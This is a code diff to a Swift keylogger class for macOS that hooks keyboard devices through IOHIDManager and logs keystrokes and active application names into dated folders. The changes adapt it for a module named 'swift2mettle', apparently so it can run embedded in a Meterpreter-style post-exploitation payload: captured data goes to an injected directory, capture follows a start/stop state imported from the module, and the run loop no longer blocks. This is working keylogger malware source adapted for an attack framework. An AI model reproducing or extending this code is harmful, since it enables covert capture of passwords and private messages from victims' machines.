@@ -9,12 +9,15 @@
 import Foundation
 import IOKit.hid
 import Cocoa
+import let swift2mettle.KEYLOGGER_DATA_DIR
+import let swift2mettle.KEYLOGGER_STATE_START
+import func swift2mettle.keylogger_get_state
 
 class Keylogger
 {
     var manager: IOHIDManager
     var deviceList = NSArray()                  // Used in multiple matching dictionary
-    var bundlePathURL = Bundle.main.bundleURL   // Path to where the executable is present - Change this to use custom path
+    var bundlePathURL = URL(fileURLWithPath: KEYLOGGER_DATA_DIR) // Root directory to store captured data
     var appName = ""                            // Active App name
     var appData:URL                             // Folder
     var keyData:URL                             // Folder
@@ -22,16 +25,16 @@ class Keylogger
     
     init()
     { 
-        appData = bundlePathURL.appendingPathComponent("Data").appendingPathComponent("App") // Creates App Folder in Data Folder
-        keyData = bundlePathURL.appendingPathComponent("Data").appendingPathComponent("Key") // Creates Key Folder in Data Folder
-        devicesData = bundlePathURL.appendingPathComponent("Data").appendingPathComponent("Devices") // Creates Devices Folder in Data Folder
+        appData = bundlePathURL.appendingPathComponent("App") // Creates App Folder in Data Folder
+        keyData = bundlePathURL.appendingPathComponent("Key") // Creates Key Folder in Data Folder
+        devicesData = bundlePathURL.appendingPathComponent("Devices") // Creates Devices Folder in Data Folder
         manager = IOHIDManagerCreate(kCFAllocatorDefault, IOOptionBits(kIOHIDOptionsTypeNone))
 
         if !(FileManager.default.fileExists(atPath: appData.path) && FileManager.default.fileExists(atPath: keyData.path))
         {
             do
             {
-                try FileManager.default.createDirectory(at: bundlePathURL.appendingPathComponent("Data"), withIntermediateDirectories: false, attributes: nil)
+                try FileManager.default.createDirectory(at: bundlePathURL, withIntermediateDirectories: false, attributes: nil)
                 try FileManager.default.createDirectory(at: appData, withIntermediateDirectories: false, attributes: nil)
                 try FileManager.default.createDirectory(at: keyData, withIntermediateDirectories: false, attributes: nil)
                 try FileManager.default.createDirectory(at: devicesData, withIntermediateDirectories: false, attributes: nil)
@@ -79,7 +82,9 @@ class Keylogger
         scheduleHIDLoop()
        
         /* Running in Loop */
-        RunLoop.current.run()
+        RunLoop.current.run(
+		mode: RunLoopMode.defaultRunLoopMode,
+		before: Date.distantPast)
     }
     
     @objc dynamic func activatedApp(notification: NSNotification)
@@ -89,6 +94,11 @@ class Keylogger
             let name = app.localizedName
         {
             self.appName = name
+
+            if keylogger_get_state() != KEYLOGGER_STATE_START
+            {
+                return;
+            }
             
             let dateFolder = "\(CallBackFunctions.calander.component(.day, from: Date()))-\(CallBackFunctions.calander.component(.month, from: Date()))-\(CallBackFunctions.calander.component(.year, from: Date()))"
             let path = self.appData.appendingPathComponent(dateFolder)
